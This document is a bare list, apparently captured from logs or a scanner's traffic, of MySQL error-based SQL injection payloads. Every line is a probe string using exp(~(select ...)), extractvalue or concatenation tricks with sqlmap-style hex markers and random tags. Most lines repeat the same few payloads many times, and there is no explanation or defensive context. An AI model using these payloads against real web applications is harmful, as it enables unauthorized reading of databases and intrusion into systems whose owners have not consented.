+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
